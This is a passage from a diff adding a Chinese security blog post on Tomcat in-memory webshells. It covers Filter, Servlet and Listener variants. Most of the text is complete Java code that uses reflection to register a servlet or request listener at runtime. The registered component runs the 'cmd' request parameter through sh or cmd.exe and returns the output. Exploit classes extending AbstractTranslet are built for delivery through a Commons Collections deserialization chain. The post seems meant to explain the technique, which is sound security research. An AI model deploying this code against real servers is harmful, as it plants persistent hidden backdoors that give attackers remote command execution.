+                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
+
+                javax.servlet.FilterRegistration.Dynamic fr = applicationContext.addFilter(filterName, sf);
+
+                //状态恢复
+                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
+
+                fr.setAsyncSupported(false);
+                fr.addMappingForUrlPatterns(
+                        java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST),
+                        false,
+                        new String[]{&quot;/*&quot;}
+                );
+
+
+                standardContext.filterStart();
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>然后就可以用CC链3来打了。连续发送两次打入Filter<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/23.png" alt="" loading="lazy"></p>
+<p>Filter成功被打入<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/24.png" alt="" loading="lazy"></p>
+<h1 id="servlet内存马">Servlet内存马</h1>
+<p>回顾一下知识点——<a href="https://www.jianshu.com/p/1a2d2f868143">深入理解Tomcat（八）Container</a>。一个servlet在Tomcat的容器中就是一个Wrapper，而Wrapper又是被Context包含的。</p>
+<p>添加Servlet的方法相对比较简单：</p>
+<ul>
+<li>新建一个Wrapper对象</li>
+<li>通过 <code>StandardContext#addChild</code> 把它加到 StandardContext 的 children 当中</li>
+<li>通过 <code>StandardContext#addServletMapping</code>将新建的 Wrapper 对象，和访问的 url 进行绑定。</li>
+</ul>
+<p>动态添加Servlet的Servlet代码如下，参考<a href="https://github.com/su18/MemoryShell/blob/main/memshell-test/memshell-test-tomcat/src/org/su18/memshell/test/tomcat/AddTomcatServlet.java">su18-AddTomcatServlet.java</a></p>
+<pre><code class="language-java">package com.memshell.tomcat.addServlet;
+
+import org.apache.catalina.Wrapper;
+import org.apache.catalina.core.StandardContext;
+
+import javax.servlet.Servlet;
+import javax.servlet.ServletContext;
+import javax.servlet.ServletException;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.PrintWriter;
+import java.lang.reflect.Field;
+import java.util.Scanner;
+
+@WebServlet(&quot;/addServlet&quot;)
+public class AddServlet extends HttpServlet {
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        try {
+
+            String servletName = &quot;skkyServlet&quot;;
+
+            // 从 request 中获取 servletContext
+            ServletContext servletContext = req.getServletContext();
+
+            // 如果已有此 servletName 的 Servlet，则不再重复添加
+            if (servletContext.getServletRegistration(servletName) == null) {
+
+                StandardContext o = null;
+
+                // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
+                while (o == null) {
+                    Field f = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+                    f.setAccessible(true);
+                    Object object = f.get(servletContext);
+
+                    if (object instanceof ServletContext) {
+                        servletContext = (ServletContext) object;
+                    } else if (object instanceof StandardContext) {
+                        o = (StandardContext) object;
+                    }
+                }
+
+                // 创建自定义 Servlet
+                Servlet evilServlet = new EvilServlet();
+
+                // 使用 Wrapper 封装 Servlet
+                Wrapper wrapper = o.createWrapper();
+                wrapper.setName(servletName);
+                wrapper.setLoadOnStartup(1);
+                wrapper.setServlet(evilServlet);
+                wrapper.setServletClass(evilServlet.getClass().getName());
+
+                // 向 children 中添加 wrapper
+                o.addChild(wrapper);
+
+                // 添加 servletMappings
+                o.addServletMapping(&quot;/skkyblu3&quot;, servletName);
+
+                PrintWriter writer = resp.getWriter();
+                writer.println(&quot;tomcat servlet added&quot;);
+
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+}
+
+class EvilServlet extends HttpServlet{
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        String cmd = req.getParameter(&quot;cmd&quot;);
+        boolean isLinux = true;
+        String osTyp = System.getProperty(&quot;os.name&quot;);
+        if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {
+            isLinux = false;
+        }
+        String[] cmds = isLinux ? new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, cmd} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd};
+        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+        Scanner s = new Scanner(in).useDelimiter(&quot;\\a&quot;);
+        String output = s.hasNext() ? s.next() : &quot;&quot;;
+        PrintWriter out = resp.getWriter();
+        out.write(output);
+        out.flush();
+    }
+}
+</code></pre>
+<h2 id="利用-2">利用</h2>
+<p>利用场景和filter一样，这里实现Servlet的接口来写。代码如下：</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.catalina.Wrapper;
+import org.apache.catalina.core.ApplicationFilterChain;
+import org.apache.catalina.core.StandardContext;
+
+import javax.servlet.*;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.PrintWriter;
+import java.lang.reflect.Field;
+import java.util.Scanner;
+
+public class tomcatServletExploit extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements Servlet {
+    static {
+        try {
+            Field WRAP_SAME_OBJECT_FIELD = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;).getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);
+            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);
+            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedResponse&quot;);
+
+            Field modifiersField = Field.class.getDeclaredField(&quot;modifiers&quot;);
+            modifiersField.setAccessible(true);
+            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);
+            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);
+            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);
+
+            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
+            lastServicedRequestField.setAccessible(true);
+            lastServicedResponseField.setAccessible(true);
+
+            ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(null);
+            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(null);
+            boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
+
+            if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
+                lastServicedRequestField.set(null, new ThreadLocal&lt;&gt;());
+                lastServicedResponseField.set(null, new ThreadLocal&lt;&gt;());
+                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
+            } else {
+                ServletRequest requestFacade = lastServicedRequest.get();
+                addServlet((HttpServletRequest) requestFacade);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+
+    @Override
+    public void init(ServletConfig config) throws ServletException {
+
+    }
+
+    @Override
+    public ServletConfig getServletConfig() {
+        return null;
+    }
+
+    @Override
+    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
+        String cmd = req.getParameter(&quot;cmd&quot;);
+        boolean isLinux = true;
+        String osTyp = System.getProperty(&quot;os.name&quot;);
+        if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {
+            isLinux = false;
+        }
+        String[] cmds = isLinux ? new String[]{&quot;sh&quot;, &quot;-c&quot;, cmd} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd};
+        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+        Scanner s = new Scanner(in).useDelimiter(&quot;\\a&quot;);
+        String output = s.hasNext() ? s.next() : &quot;&quot;;
+        PrintWriter out = res.getWriter();
+        out.println(output);
+        out.flush();
+        out.close();
+
+    }
+
+    @Override
+    public String getServletInfo() {
+        return null;
+    }
+
+    @Override
+    public void destroy() {
+
+    }
+
+    static void addServlet(HttpServletRequest req) {
+        try {
+
+            String servletName = &quot;skkyServlet&quot;;
+
+            // 从 request 中获取 servletContext
+            ServletContext servletContext = req.getServletContext();
+
+            // 如果已有此 servletName 的 Servlet，则不再重复添加
+            if (servletContext.getServletRegistration(servletName) == null) {
+
+                StandardContext o = null;
+
+                // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
+                while (o == null) {
+                    Field f = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+                    f.setAccessible(true);
+                    Object object = f.get(servletContext);
+
+                    if (object instanceof ServletContext) {
+                        servletContext = (ServletContext) object;
+                    } else if (object instanceof StandardContext) {
+                        o = (StandardContext) object;
+                    }
+                }
+
+                // 创建自定义 Servlet
+                Servlet evilServlet = new tomcatServletExploit();
+
+                // 使用 Wrapper 封装 Servlet
+                Wrapper wrapper = o.createWrapper();
+                wrapper.setName(servletName);
+                wrapper.setLoadOnStartup(1);
+                wrapper.setServlet(evilServlet);
+                wrapper.setServletClass(evilServlet.getClass().getName());
+
+                // 向 children 中添加 wrapper
+                o.addChild(wrapper);
+
+                // 添加 servletMappings
+                o.addServletMapping(&quot;/skkyblu3&quot;, servletName);
+
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>访问两次写入Servlet<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/25.png" alt="" loading="lazy"></p>
+<p>成功写入Servlet<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/26.png" alt="" loading="lazy"></p>
+<h1 id="listener内存马">Listener内存马</h1>
+<p>Tomcat 中 EventListeners 存放在 StandardContext 的 applicationEventListenersList 属性中，同样可以使用 StandardContext 的相关 add 方法添加。<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/27.png" alt="" loading="lazy"></p>
+<p>这里添加一个RequestListener，在requestDestroyed里面执行命令</p>
+<pre><code class="language-java">package com.memshell.tomcat.addRequestListener;
+
+import org.apache.catalina.connector.Request;
+import org.apache.catalina.core.StandardContext;
+
+import javax.servlet.ServletContext;
+import javax.servlet.ServletException;
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.io.InputStream;
+import java.lang.reflect.Field;
+import java.util.Scanner;
+
+@WebServlet(&quot;/addRequestListener&quot;)
+public class AddRequestListener extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        ServletContext servletContext = req.getServletContext();
+
+        StandardContext o = null;
+
+        try {
+
+            // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
+            while (o == null) {
+                Field f = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+                f.setAccessible(true);
+                Object object = f.get(servletContext);
+
+                if (object instanceof ServletContext) {
+                    servletContext = (ServletContext) object;
+                } else if (object instanceof StandardContext) {
+                    o = (StandardContext) object;
+                }
+            }
+
+            // 添加监听器
+            o.addApplicationEventListener(new EvilRequestListener());
+
+            resp.getWriter().println(&quot;tomcat listener added&quot;);
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+class EvilRequestListener implements ServletRequestListener {
+
+    @Override
+    public void requestDestroyed(ServletRequestEvent sre) {
+        // 当请求对象销毁时触发
+        try {
+            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
+            String cmd = req.getParameter(&quot;cmd&quot;);
+            if (req.getParameter(&quot;cmd&quot;) != null) {
+                Field requestF = req.getClass().getDeclaredField(&quot;request&quot;);
+                requestF.setAccessible(true);
+                Request request = (Request) requestF.get(req);
+
+
+                boolean isLinux = true;
+                String osTyp = System.getProperty(&quot;os.name&quot;);
+                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {
+                    isLinux = false;
+                }
+                String[] cmds = isLinux ? new String[]{&quot;sh&quot;, &quot;-c&quot;, cmd} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd};
+                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+                Scanner s = new Scanner(in).useDelimiter(&quot;\\a&quot;);
+                String output = s.hasNext() ? s.next() : &quot;&quot;;
+
+                request.getResponse().getWriter().write(output);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void requestInitialized(ServletRequestEvent sre) {
+        // 当请求对象创建时触发
+    }
+}
+</code></pre>
+<h2 id="利用-3">利用</h2>
+<p>和之前一样，利用ServletRequestListener接口来做。代码如下：</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.catalina.connector.Request;
+import org.apache.catalina.core.ApplicationFilterChain;
+import org.apache.catalina.core.StandardContext;
+
+import javax.servlet.*;
+import javax.servlet.http.HttpServletRequest;
+import java.io.InputStream;
+import java.lang.reflect.Field;
+import java.util.Scanner;
+
+public class tomcatRequestListenerExploit extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements ServletRequestListener{
+    static {
+        try {
+            Field WRAP_SAME_OBJECT_FIELD = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;).getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);
+            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);
+            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedResponse&quot;);
+
+            Field modifiersField = Field.class.getDeclaredField(&quot;modifiers&quot;);
+            modifiersField.setAccessible(true);
+            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);
+            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);
+            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);
+
+            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
+            lastServicedRequestField.setAccessible(true);
+            lastServicedResponseField.setAccessible(true);
+
+            ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(null);
+            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(null);
+            boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
+
+            if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
+                lastServicedRequestField.set(null, new ThreadLocal&lt;&gt;());
+                lastServicedResponseField.set(null, new ThreadLocal&lt;&gt;());
+                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
+            } else {
+                ServletRequest requestFacade = lastServicedRequest.get();
+                addRequestListener((HttpServletRequest) requestFacade);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+
+    @Override
+    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
+        try {
+            HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest();
+            String cmd = req.getParameter(&quot;cmd&quot;);
+            if (req.getParameter(&quot;cmd&quot;) != null) {
+                Field requestF = req.getClass().getDeclaredField(&quot;request&quot;);
+                requestF.setAccessible(true);
+                Request request = (Request) requestF.get(req);
+
+
+                boolean isLinux = true;
+                String osTyp = System.getProperty(&quot;os.name&quot;);
+                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {
+                    isLinux = false;
+                }
+                String[] cmds = isLinux ? new String[]{&quot;sh&quot;, &quot;-c&quot;, cmd} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd};
+                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+                Scanner s = new Scanner(in).useDelimiter(&quot;\\a&quot;);
+                String output = s.hasNext() ? s.next() : &quot;&quot;;
+
+                request.getResponse().getWriter().write(output);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
+
+    }
+
+    static void addRequestListener(HttpServletRequest req) {
+        ServletContext servletContext = req.getServletContext();
+
+        StandardContext o = null;
+
+        try {
+
+            // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
+            while (o == null) {
+                Field f = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+                f.setAccessible(true);
+                Object object = f.get(servletContext);
+
+                if (object instanceof ServletContext) {
+                    servletContext = (ServletContext) object;
+                } else if (object instanceof StandardContext) {
+                    o = (StandardContext) object;
+                }
+            }
+
+            // 添加监听器
+            o.addApplicationEventListener(new tomcatRequestListenerExploit());
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+</code></pre>
+<p>访问两次写入RequestListener<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/28.png" alt="" loading="lazy"></p>
+<p>成功写入<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/29.png" alt="" loading="lazy"></p>
+<h1 id="参考文章">参考文章</h1>
+<p><a href="https://su18.org/post/memory-shell/">https://su18.org/post/memory-shell/</a><br>
+<a href="https://xz.aliyun.com/t/7388">https://xz.aliyun.com/t/7388</a><br>
+<a href="https://www.cnblogs.com/nice0e3/p/14622879.html">https://www.cnblogs.com/nice0e3/p/14622879.html</a><br>
+<a href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&amp;mid=2652474966&amp;idx=1&amp;sn=1c75686865f7348a6b528b42789aeec8&amp;scene=21">https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&amp;mid=2652474966&amp;idx=1&amp;sn=1c75686865f7348a6b528b42789aeec8&amp;scene=21</a><br>
+<a href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#filter%E5%86%85%E5%AD%98%E9%A9%AC">Filter内存马</a>
+<ul>
+<li><a href="#filter%E5%88%9D%E5%A7%8B%E5%8C%96">Filter初始化</a></li>
+<li><a href="#filter%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F">Filter工作方式</a></li>
+<li><a href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8Cfilter">动态注册Filter</a>
+<ul>
+<li><a href="#%E5%AE%9E%E9%AA%8C%E5%87%86%E5%A4%87">实验准备</a></li>
+<li><a href="#%E6%96%B9%E6%B3%95%E4%B8%80%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0%E4%BF%AE%E6%94%B9">方法一：调用函数修改</a></li>
+<li><a href="#%E6%96%B9%E6%B3%95%E4%BA%8C%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9">方法二：反射修改</a></li>
+</ul>
+</li>
+<li><a href="#%E5%88%A9%E7%94%A8">利用</a></li>
+</ul>
+</li>
+<li><a href="#servlet%E5%86%85%E5%AD%98%E9%A9%AC">Servlet内存马</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8-2">利用</a></li>
+</ul>
+</li>
+<li><a href="#listener%E5%86%85%E5%AD%98%E9%A9%AC">Listener内存马</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8-3">利用</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">参考文章</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/yi-zhou-ctf-8/">
+              <h3 class="post-title">
+                亿周CTF 8
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
